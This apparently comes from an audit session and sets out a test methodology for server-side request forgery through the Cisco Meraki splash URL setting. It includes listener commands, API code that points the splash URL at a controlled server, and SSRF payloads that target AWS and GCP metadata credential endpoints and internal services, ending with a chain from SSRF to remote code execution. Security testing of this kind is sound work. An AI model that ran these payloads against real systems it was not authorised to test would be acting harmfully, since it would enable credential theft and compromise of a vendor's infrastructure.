# Meraki Splash SSRF Test Methodology — Reference

## Source
Session: CDC Audit Cisco Meraki (2026-08-22)
File: `meraki_step2_splash_ssrf.md`

## SSRF Hypothesis
Custom `splashUrl` (via `updateNetworkWirelessSsidSplashSettings`) may be fetched **server-side** by Meraki device or cloud when guest connects to SSID.

## Test Prerequisites
- Valid Meraki network with MR access points
- API key with `wireless:config:write` permission
- Controlled HTTP server to monitor inbound requests

## Test Steps

### 1. Setup Monitoring Server
```bash
python3 -m http.server 8080
# Or netcat for raw logging
nc -l -p 8080 -v
```

### 2. Configure Custom Splash URL
```python
import meraki
dashboard = meraki.DashboardAPI(API_KEY)
dashboard.wireless.updateNetworkWirelessSsidSplashSettings(
    networkId='YOUR_NETWORK_ID',
    number='1',  # SSID number
    useSplashUrl=True,
    splashUrl='http://YOUR_SERVER_IP:8080/test'
)
```

### 3. Trigger Guest Connection
- Connect a device to the SSID
- Or click "Preview" in Dashboard SSID splash settings
- Monitor server logs for inbound request

### 4. Test Payloads

| Payload | Target | Expected if SSRF |
|---------|--------|------------------|
| `http://169.254.169.254/latest/meta-data/` | AWS IMDSv1 | Instance metadata, IAM credentials |
| `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | AWS IAM | Role credentials |
| `http://metadata.google.internal/computeMetadata/v1/` | GCP | Service account tokens |
| `http://169.254.169.254/latest/user-data` | AWS User Data | Potential secrets |
| `http://localhost:8080/internal` | Local services | Internal admin panels |

### 5. Monitor for Requests
Check server logs for:
- Source IP (Meraki cloud IP vs device IP)
- User-Agent
- Request headers
- Full URL requested

## Expected Outcomes

| Scenario | Server Logs Show | SSRF Confirmed |
|----------|------------------|----------------|
| Device fetches | Request from device LAN IP | **YES - Device SSRF** |
| Cloud fetches | Request from Meraki cloud IP range | **YES - Cloud SSRF** |
| Client redirect only | Request from guest client IP | **NO - Client redirect** |
| No request | No logs | **NO - Not triggered** |

## Meraki Cloud IP Ranges (for identification)
- `209.206.51.0/24` (api.meraki.com)
- `158.115.141.0/24` (dashboard shards)
- `3.167.112.0/24` (DevNet)
- Check `ikarem.io` IPs for internal services

## If SSRF Confirmed (P1-P2)
- **Cloud SSRF**: Access to Meraki internal services (`ikarem.io`, Artifactory, ArgoCD, NetBox)
- **Device SSRF**: Access to device localhost services, cloud metadata
- **Chaining**: SSRF → Internal service RCE → Full compromise